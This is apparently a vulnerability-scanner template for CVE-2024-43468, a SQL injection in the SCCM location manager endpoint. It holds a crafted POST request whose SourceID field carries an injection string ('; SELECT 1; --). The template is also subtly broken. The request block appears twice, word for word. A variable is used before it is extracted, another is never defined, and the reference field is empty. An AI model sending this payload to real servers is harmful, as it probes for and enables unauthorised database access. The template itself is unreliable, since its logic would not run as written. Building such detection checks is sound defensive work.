id: CVE-2024-43468

info:
  name: SCCM LocationMgr (MP_Location) Unauthenticated SQL Injection
  author: betmen-n-dgeng
  severity: critical
  description: |
    Detects unauthenticated SQL injection vulnerability in SCCM (System Center Configuration Manager) via the MP_LocationManager endpoint.
  reference:
    - 
  tags: sqli, sccm, cve-2024-43468

requests:
  - method: POST
    path: "/ccm_system/request"
    headers:
      User-Agent: "ConfigMgr Messaging HTTP Sender"
      Content-Type: 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
    body: |
      --aAbBcCdDv1234567890VxXyYzZ
      content-type: text/plain; charset=UTF-16

      <Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="100" Offset="0" /><CorrelationID>{{{00000000-0000-0000-0000-000000000000}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{00000000-0000-0000-0000-000000000000}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{Hostname}}</TargetAddress><TargetEndpoint>MP_LocationManager</TargetEndpoint><TargetHost>{{Hostname}}</TargetHost><Timeout>60000</Timeout><SourceID>GUID:{{uuid}}'; SELECT 1; -- </SourceID></Msg>
      --aAbBcCdDv1234567890VxXyYzZ
      content-type: application/octet-stream

      {{zlib_compressed_data}}
      --aAbBcCdDv1234567890VxXyYzZ--
    matchers:
      - type: word
        part: body
        words:
          - "NoReply"
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: uuid
        part: body
        regex: 'SourceID="GUID:([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})'

  - method: POST
    path: "/ccm_system/request"
    headers:
      User-Agent: "ConfigMgr Messaging HTTP Sender"
      Content-Type: 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
    body: |
      --aAbBcCdDv1234567890VxXyYzZ
      content-type: text/plain; charset=UTF-16

      <Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="100" Offset="0" /><CorrelationID>{{{00000000-0000-0000-0000-000000000000}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{00000000-0000-0000-0000-000000000000}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{Hostname}}</TargetAddress><TargetEndpoint>MP_LocationManager</TargetEndpoint><TargetHost>{{Hostname}}</TargetHost><Timeout>60000</Timeout><SourceID>GUID:{{uuid}}'; SELECT 1; -- </SourceID></Msg>
      --aAbBcCdDv1234567890VxXyYzZ
      content-type: application/octet-stream

      {{zlib_compressed_data}}
      --aAbBcCdDv1234567890VxXyYzZ--
    matchers:
      - type: word
        part: body
        words:
          - "NoReply"
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: uuid
        part: body
        regex: 'SourceID="GUID:([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})'
